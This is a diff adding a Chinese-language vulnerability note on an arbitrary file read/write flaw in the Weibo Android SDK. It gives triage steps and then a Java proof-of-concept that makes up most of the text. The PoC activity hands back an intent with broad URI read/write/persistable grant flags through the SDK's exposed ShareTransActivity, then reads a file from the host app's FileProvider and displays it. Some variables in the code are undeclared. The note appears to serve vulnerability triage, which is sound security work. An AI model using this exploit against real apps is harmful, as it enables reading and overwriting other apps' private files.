@@ -1,0 +1,72 @@
+微博SDK任意文件读写漏洞
+
+排查步骤
+1. 是否集成微博SDK，版本范围>=11.8.1，是继续；
+2. com.sina.weibo.sdk.share.ShareTransActivity是否暴露，如果暴露继续；
+3. 业务自身有没有提供FileProvider，并且读写目录没有最小化，是的话有问题，可结合上面微博SDK的ShareTransActivity漏洞进行任意文件读写。
+
+
+旧版本，没问题
+ShareResultActivity(9.12.0-10.10.0)
+
+POC
+
+public static String xmluri = "content://xxxx/cache/cc.txt";
+
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_weibo);
+
+        Log.i(TAG, "onCreate: ");
+        Intent intent = getIntent();
+
+        try {
+            Log.i(TAG, "onActivityResult: data : " + intent.toURI());
+            poc();
+            this.finish();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void poc() {
+        Intent reciver = getIntent();
+        Log.i(TAG, "poc: intent is : " + getIntent().toURI());
+        Log.i(TAG, "poc: flag is : " + getIntent().getFlags());
+        if (reciver == null) {
+            Log.e(TAG, "failed because obtain Empty intent;");
+            return;
+        }
+        key = reciver.getStringExtra("share_back_flag");
+        try {
+            Intent attacker = new Intent();
+            attacker.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
+            attacker.setData(Uri.parse(uri));
+            attacker.putExtra("share_back_flag", key);
+            Log.i(TAG, "poc: intent is : " + attacker.toURI());
+            Log.i(TAG, "poc: intent is : " + attacker.getData().toString());
+            this.setResult(-1, attacker);
+
+            InputStream o = null;
+            try {
+                // 读文件
+                o = getContentResolver().openInputStream(Uri.parse(xmluri));
+                String sp = new String(toByteArray(o));
+                String toastText = "get XML " + xmluri + " succeed : \n" + sp;
+                Toast.makeText(this, toastText, Toast.LENGTH_SHORT).show();
+                o.close();
+            } catch (Exception e) {
+                e.printStackTrace();
+                Toast.makeText(this, "get XML " + xmluri + " failed : \n" + e.getMessage(), Toast.LENGTH_SHORT).show();
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            Log.e(TAG, "poc: exception : ", e);
+        }
+    }
+
+
+
